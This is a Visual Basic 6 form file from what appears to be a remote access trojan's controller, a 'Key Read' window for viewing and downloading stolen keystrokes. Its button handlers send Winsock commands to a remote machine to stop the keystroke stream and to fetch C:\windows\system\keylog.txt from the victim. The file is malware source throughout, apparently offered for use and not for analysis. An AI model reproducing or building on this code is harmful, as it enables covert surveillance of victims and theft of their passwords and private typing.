VERSION 5.00
Begin VB.Form frmKeylog 
   BackColor       =   &H80000011&
   BorderStyle     =   5  'Sizable ToolWindow
   Caption         =   "Key Read"
   ClientHeight    =   4635
   ClientLeft      =   60
   ClientTop       =   315
   ClientWidth     =   5235
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   4635
   ScaleWidth      =   5235
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.CommandButton Command2 
      Caption         =   "Download KeyLog file"
      Height          =   255
      Left            =   2760
      TabIndex        =   3
      Top             =   4320
      Width           =   1815
   End
   Begin VB.CommandButton Command3 
      Caption         =   "Clear TEXT"
      Height          =   255
      Left            =   1320
      TabIndex        =   2
      Top             =   4320
      Width           =   1335
   End
   Begin VB.CommandButton Command1 
      BackColor       =   &H80000012&
      Caption         =   "Unload"
      Height          =   255
      Left            =   0
      TabIndex        =   1
      Top             =   4320
      Width           =   1215
   End
   Begin VB.TextBox txtRead 
      Height          =   4215
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   5175
   End
End
Attribute VB_Name = "frmKeylog"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command1_Click()
frmKeylog.Hide
client.wskKeys.SendData "<END>"
End Sub

Private Sub Command2_Click()

On Error GoTo err

client.wskClient.SendData "\fileSize" & "C:\windows\system\keylog.txt"
    
    PauseData.Pause 0.5
    
resultQ = MsgBox("Do you wish to download file  " & "keylog.txt  " & " it is " & flSize & " bytes" & " ?", vbOKCancel, "??")
 
 If resultQ = vbOK Then
 client.cmSave.ShowSave
 Else
 Exit Sub
 End If
 
 If Not vbCancel Then
 
SavePath = client.cmSave.FileName
 
PauseData.Pause 1

client.lblSize.Caption = flSize
client.ProgressBar1.Min = 0
client.ProgressBar1.Max = flSize
 
client.wskClient.SendData "\filePath" & "C:\windows\system\keylog.txt"

End If

err:
Exit Sub

End Sub

Private Sub Command3_Click()
frmKeylog.txtRead.Text = ""
End Sub

